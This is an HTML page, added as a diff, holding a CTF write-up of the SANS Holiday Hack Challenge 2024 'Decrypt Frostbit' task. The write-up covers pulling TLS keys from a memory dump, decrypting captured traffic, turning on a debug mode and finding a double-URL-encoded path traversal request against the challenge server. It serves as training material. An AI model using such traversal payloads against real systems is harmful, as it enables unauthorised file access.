@@ -1,0 +1,1245 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Elf%20Stack/">
+      
+      
+        <link rel="next" href="../Deactivate%20Frostbit/">
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.49">
+    
+    
+      
+        <title>Decrypt Frostbit - GmanSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hint-1-frostbit-hashing" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="GmanSec" class="md-header__button md-logo" aria-label="GmanSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            GmanSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Decrypt Frostbit
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../blog/" class="md-tabs__link">
+        
+  
+    
+  
+  Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  CTF Write-ups
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="GmanSec" class="md-nav__button md-logo" aria-label="GmanSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    GmanSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../blog/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blog
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTF Write-ups
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Write-ups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    SANS Holiday Hack Challenge
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            SANS Holiday Hack Challenge
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../CTF Write-ups/SANS Holiday Hack Challenge/index.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2_2" id="__nav_2_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Act 3
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Act 3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Act III
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Santa%20Vision/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Santa Vision
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Elf%20Stack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Elf Stack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Decrypt Frostbit
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Decrypt Frostbit
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hint-1-frostbit-hashing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 1 - Frostbit Hashing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-2-frostbit-dev-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 2 - Frostbit Dev Mode
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-3-frostbit-crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 3 - Frostbit Crypto
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-4-frostbit-forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 4 - Frostbit Forensics
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#access-to-the-challenge-environment-set-up" class="md-nav__link">
+    <span class="md-ellipsis">
+      Access to the Challenge - Environment set up
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solution
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-message-from-tangle-coalbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Message from Tangle Coalbox
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Deactivate%20Frostbit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deactivate Frostbit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hint-1-frostbit-hashing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 1 - Frostbit Hashing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-2-frostbit-dev-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 2 - Frostbit Dev Mode
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-3-frostbit-crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 3 - Frostbit Crypto
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-4-frostbit-forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 4 - Frostbit Forensics
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#access-to-the-challenge-environment-set-up" class="md-nav__link">
+    <span class="md-ellipsis">
+      Access to the Challenge - Environment set up
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solution
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-message-from-tangle-coalbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Message from Tangle Coalbox
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<div style="text-align: center; font-size: 2em; font-weight: bold; color: black; margin-bottom: 20px;">
+    Decrypt Frostbit - Tangle Coalbox
+</div>
+
+<p>Tangle Coalbox needs our help to deal with the Frostbit Ransomware. This is what he tell us when we speak to him:</p>
+<p><img alt="Tangle Coalbox Conversation 1" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Tangle%20Coalbox-1.png" />
+<img alt="Tangle Coalbox Conversation 2" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Tangle%20Coalbox-2.png" /></p>
+<p>Dusty Giftwrap had provided us with some hints after completing Snowball Showdown in Act 2:</p>
+<h2 id="hint-1-frostbit-hashing">Hint 1 - Frostbit Hashing</h2>
+<p>The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns before forwarding requests to the backend application. A reverse proxy may reject requests it considers invalid. You may need to employ creative methods to ensure the request is properly forwarded to the backend. There could be a way to exploit the cryptographic library by crafting a specific request using relative paths, encoding to pass bytes and using known values retrieved from other forensic artifacts. If successful, this could be the key to tricking the Frostbit infrastructure into revealing a secret necessary to decrypt files encrypted by Frostbit.</p>
+<h2 id="hint-2-frostbit-dev-mode">Hint 2 - Frostbit Dev Mode</h2>
+<p>There's a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn't disable dev mode, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be broadcasting MQTT messages.</p>
+<h2 id="hint-3-frostbit-crypto">Hint 3 - Frostbit Crypto</h2>
+<p>The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use.</p>
+<h2 id="hint-4-frostbit-forensics">Hint 4 - Frostbit Forensics</h2>
+<p>I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes.</p>
+<h2 id="access-to-the-challenge-environment-set-up">Access to the Challenge - Environment set up</h2>
+<p><strong>Note</strong>: Decrypt Frostbit and Deactivate Frostbit use the same generated environment. If you want to start with Deactivate first, you still need to do the below set up first.</p>
+<p>When clicking on the terminal, a message with the following text is presented to us:</p>
+<div style="text-align: center; background-color: black; padding: 20px; border-radius: 10px; color: white;">
+  <p style="color: #00ff00; font-size: 1.5em; font-weight: bold;">
+    North Pole Cyber Security Department
+  </p>
+      <p style="color: #d3d3d3; font-size: 1.2em;">
+    Frostbit Ransomware Incident
+  </p>
+  <p style="color: #87CEFA; font-size: 1.1em;">
+    The <strong>Naughty-Nice list</strong> has been encrypted by the Frostbit ransomware.
+  </p>
+  <p style="color: #87CEFA; font-size: 1.1em;">
+    Click the button below to download the forensic artifacts collected by the North Pole Cyber Security Department from the compromised computer. Use these artifacts to help decrypt the <strong>Naughty-Nice list</strong> and prevent its publication by the ransomware server.
+  </p>
+</div>
+
+<p>Clicking on the "Generate &amp; Download Artifacts" button will produce the required artifacts. However, it's important to note:</p>
+<ul>
+<li>If you click "Generate &amp; Download Artifacts" again at any point, you may need to redo some steps.</li>
+<li>Certain data is exclusive to the artifacts generated during a specific session.</li>
+</ul>
+<p><img alt="Generating Artifacts" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-1.png" /></p>
+<p>Once the artifact generation is completed, a download will start and we will get a file called frostbitartifacts.zip. Inside the zip file, we have the following files:</p>
+<ul>
+<li>DoNotAlterOrDeleteMe.frostbit.json</li>
+<li>naughty_nice_list.csv.frostbit</li>
+<li>ransomware_traffic.pcap</li>
+<li>frostbit.elf</li>
+<li>frostbit_core_dump.13</li>
+</ul>
+<h1 id="solution"><strong>Solution</strong></h1>
+<p><img alt="Decrypt Frostbit Objective" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-2.png" /></p>
+<p>The naughty_nice_list.csv.frostbit appears to be an encrypted file, so our final target will be to unencrypt that file.</p>
+<p>The hint suggests to use 'strings' on a memory dump, so I began by running that command against frostbit_core_dump.13. I carefully reviewed the output, copying all interesting strings into my notes for further examination. To organize the data, I categorized the strings into different types of information, mainly:</p>
+<ul>
+<li>TLS keys</li>
+<li>messages with digest data</li>
+<li>API queries and URLs</li>
+<li>Any other random data</li>
+</ul>
+<p>One of the initial observations was the presence of TLS keys. I compiled all related strings into a file, removed duplicates and incomplete entries, and ended up with the following data:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+SERVER_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 c9af7db1b3afd5da3b5e6b702966dd74a31f9711417c0f45f0ca83e17b50819f
+SERVER_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 cb57d4449fbd947abe10c19a29fd65c22720e6690f0a26d87b830f7382c18d44
+CLIENT_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 b11d81e40c6039861fed820d46eac83e8876314780bf85418376a5d4a55ad8d4
+CLIENT_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 694a63cb7d0a558bff58be6c922d88f16bcdb09b27fd6a29e132e48243e9e716
+</pre>
+
+<p>The above looks like TLS secrets. In particular, they are used for the following:</p>
+<ul>
+<li>The <code>CLIENT_HANDSHAKE_TRAFFIC_SECRET</code> and <code>SERVER_HANDSHAKE_TRAFFIC_SECRET</code> are used for handshake decryption.</li>
+<li>The <code>CLIENT_TRAFFIC_SECRET_0</code> and <code>SERVER_TRAFFIC_SECRET_0</code> allow decryption of application-layer traffic (e.g., HTTP).</li>
+</ul>
+<p>Where could we use that information? Well, we have a pcap file, so it looks like a good place to explore. I opened the pcap and inside there was encrypted TLS traffic. To attempt to unencrypt it with the information gathered from the memory dump, I created a file called tls-secrets.txt with the following content:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+CLIENT_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 694a63cb7d0a558bff58be6c922d88f16bcdb09b27fd6a29e132e48243e9e716
+SERVER_HANDSHAKE_TRAFFIC_SECRET a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 cb57d4449fbd947abe10c19a29fd65c22720e6690f0a26d87b830f7382c18d44
+CLIENT_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 b11d81e40c6039861fed820d46eac83e8876314780bf85418376a5d4a55ad8d4
+SERVER_TRAFFIC_SECRET_0 a1642c3a0b6da0f0b5c6d6777d5ea9e618b7cfa8f31436673831f6708991f453 c9af7db1b3afd5da3b5e6b702966dd74a31f9711417c0f45f0ca83e17b50819f
+</pre>
+
+<p>Then, I loaded it into wireshark as follow:</p>
+<p><code>Edit &gt; Preferences &gt; Protocols &gt; TLS &gt; load the file at Pre-Master Secret log filename.</code></p>
+<p>After reloading the pcap I could see the traffic unencrypted:</p>
+<p><img alt="Decrypted pcap" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-3.png" /></p>
+<p>So, in summary, we can see the following requests and server replies:</p>
+<pre><code>GET /api/v1/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/session HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Accept-Encoding: gzip
+
+HTTP/1.1 200 OK
+Server: nginx/1.27.1
+Date: Sat, 28 Dec 2024 10:44:50 GMT
+Content-Type: application/json
+Content-Length: 29
+Connection: keep-alive
+Strict-Transport-Security: max-age=31536000
+
+{&quot;nonce&quot;:&quot;a899f16565491df4&quot;}
+</code></pre>
+<pre><code>POST /api/v1/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/key HTTP/1.1
+Host: api.frostbit.app
+User-Agent: Go-http-client/1.1
+Content-Length: 1070
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{&quot;encryptedkey&quot;:&quot;1f431a1614b6d4c6ae0081276934e1a9e8b5426e048eb5a57f80c21e3fb4453c283ca31d2854b2071fef019d1cb1c444d4bf0f4982ea780531ec86163747b31bc2f5a8c2f08fda8211466b1493af279bac4fd5357d8e316cbbd6e5eaf31b382598dfeef14ec1e0ee6ab3c7da1a635ea39e1e16998f250498440f0c751bc40a3dd7fb268778ad46ac337ec1fc59de6e35c107953524479b76aca264e56e4d6d5057d3b552314eae0461445cda615ea8acccc68f0cf75bf089253deb6313325dc008f4549d564965907a87b2a3e1099792bfe49a566dda8a8e7278f73a32c4345ab2f8f99caf4bc51acfd7c47d2e18aa59c3654b59960f7e1fd9cdf88cd1fd9b7ccacc539d1c23d58e1bc9bdc008aa6711a0c3db4d8e965d89125f0d3b92f743caed7266d304a8bdb49f6298ab67e4cbbbeef583e41f81f311aba208e755b038eab3dff0a441ffc469c7501592667924b7cb0048e5186c04547ef47d28f61eb970609c88bc9122144ba5f9f20ec55e0fd6c84b57ac662155f9743902222e3f653def2a715ea33232271c8dde8d82809e98c7e6b87c0924e60394fe35e7c299bff7898ddf1c9de3e667bc1e3b1423cb48e01c7f1931aec88327b0f64c34c66ef301bccbb6396ba0efd0c1786ea590803739e80ed880e72930810a7b352cf537ab8896d5c105837cfae32045811f80c50cabd6b5eac4eff08968ce7437705d476f45&quot;,&quot;nonce&quot;:&quot;a899f16565491df4&quot;}
+
+HTTP/1.1 200 OK
+Server: nginx/1.27.1
+Date: Sat, 28 Dec 2024 10:44:50 GMT
+Content-Type: application/json
+Content-Length: 97
+Connection: keep-alive
+Strict-Transport-Security: max-age=31536000
+
+{&quot;digest&quot;:&quot;e088821207024982f18ea85c03200203&quot;,&quot;status&quot;:&quot;Key Set&quot;,&quot;statusid&quot;:&quot;j2tvSGY8fhG7RkD1Sw&quot;}
+</code></pre>
+<p>The most important value from that pcap is the nonce: <strong>a899f16565491df4</strong>.</p>
+<p>Both the pcap file and the memory dump contain references to the following URL:  https://api.frostbit.app</p>
+<p>Navigating to the base URL returns a 404. However, we can try specific URLs extracted from the pcap and the memory dump. After checking all the URLs, one stood out as the most interesting:</p>
+<p>https://api.frostbit.app/view/j2tvSGY8fhG7RkD1Sw/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203</p>
+<p>Accessing the URL shows a ransom note from Wombley:</p>
+<p><img alt="Ransom note" src="../../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Deactivating%20Frostbit-4.png" /></p>
+<p>The next step was to explore the website. While inspecting the HTML, I noticed the following code snippet towards the bottom:</p>
+<pre><code class="language-html">        &lt;!-- Placeholder for Debug Data --&gt;
+        &lt;div id=&quot;debug&quot; style=&quot;margin-top: 20px;&quot;&gt;&lt;/div&gt;
+</code></pre>
+<p>Recalling the hint from the elf about dev mode, I tried adding debug=true to the URL. This successfully enabled debug mode: </p>
+<p>https://api.frostbit.app/view/j2tvSGY8fhG7RkD1Sw/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&amp;debug=true</p>
+<p>This is the data we get from debug mode:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+{"uuid": "917c8ddd-fc69-421e-8134-aa92c78e42f0", "nonce": "REDACTED", "encryptedkey": "REDACTED", "deactivated": false,  "etime": 1766534400}
+</pre>
+
+<p>As a next step, I started playing with the parameters available in the URL. Eventually, I started changing values for the digest value. I tried to simply remove one character from the digest parameter and I got an error:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+{"debug":true,"error":"Status Id File Digest Validation Error: Traceback (most recent call last):\n File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"}
+</pre>
+
+<p>That led me to discover a python script with a hashing function:</p>
+<p>https://api.frostbit.app/static/FrostBiteHashlib.py</p>
+<p>There's a few rabbit holes I followed from here, and initially, I did not know how to use that python code for my advantage so I parked it and continue checking the website using the debug mode.</p>
+<p>Eventually, I started playing with the status ID parameter in the URL. In my case, I was accessing the site using the following URL:</p>
+<p>https://api.frostbit.app/view/j2tvSGY8fhG7RkD1Sw/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&amp;debug=true</p>
+<p>So my status ID was <code>j2tvSGY8fhG7RkD1Sw</code>. </p>
+<p>When changing something in that parameter, I got the following error:</p>
+<pre><code>{&quot;debug&quot;:true,&quot;error&quot;:&quot;Status Id File Not Found&quot;}
+</code></pre>
+<p>That error suggests that <code>j2tvSGY8fhG7RkD1Sw</code> is actually a file name. I started attempting Local File Inclusion (LFI) attacks against the parameter. But alas, my initial attempts were a sad parade of failure. Then two critical pieces of information came into play:</p>
+<ul>
+<li>I noticed in the source code the following URL: <code>/static/frostbit.png</code>. Even though it is an uninteresting file, it provided a known resource that could confirm whether an LFI vulnerability was present.</li>
+<li>The hint from the elf: <em>“The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns”</em>. This made me realize I had not attempted yet to double URL encode my attempts.</li>
+</ul>
+<p>Combining these insights, I pieced together the following request to test the hypothesis:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+GET /view/%252e%252e%252fstatic%252ffrostbit.png/917c8ddd-fc69-421e-8134-aa92c78e42f0/status?digest=e088821207024982f18ea85c03200203&debug=true HTTP/2
+</pre>
+
+<p>Success! We get a different error now, suggesting that we can indeed access the file:</p>
+<pre><code class="language-json">{&quot;debug&quot;:true,&quot;error&quot;:&quot;Invalid Status Id or Digest&quot;}
+</code></pre>
+<p>However, that's still an error so I cannot access the file yet. The message mentions the digest. Remembering the python file, I realized that the digest was used to validate the file being accessed. Now with more context, I looked again at the python file:</p>
+<pre><code class="language-python">import traceback
+import binascii
+
+class Frostbyte128:
+    def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):
+        self.file_bytes = file_bytes
